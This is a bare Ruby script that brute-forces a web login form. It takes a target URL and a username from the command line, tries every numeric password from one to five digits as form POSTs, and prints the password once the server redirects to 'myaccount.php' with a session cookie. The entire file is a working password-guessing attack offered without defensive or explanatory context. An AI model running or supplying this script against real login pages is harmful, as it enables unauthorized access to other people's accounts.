require 'net/http'

Input_space = '0'..'9'
Min_length = 1
Max_length = 5
Target = ARGV[0]
User = ARGV[1]

def genst(st,pos,&block)
		return block.call(st) if pos<=0
    Input_space.each { |x| genst(st+x,pos-1,&block) }
end
    
def genallpwd(&block)
	(Min_length..Max_length).each { |l| genst("",l,&block)}
end


url = URI(Target)
params = {"user"=>User}
http = Net::HTTP.start(url.host)
req = Net::HTTP::Post.new(url.request_uri)
real_pwd = genallpwd do |pwd|	
	params["pass"]=pwd
	req.set_form_data(params)
	res = http.request(req)
	break pwd if (res['location']=='myaccount.php' && res['set-cookie'])
end
puts "\nPassword for '"+User+"' is: "+real_pwd if real_pwd.is_a?String

http.finish


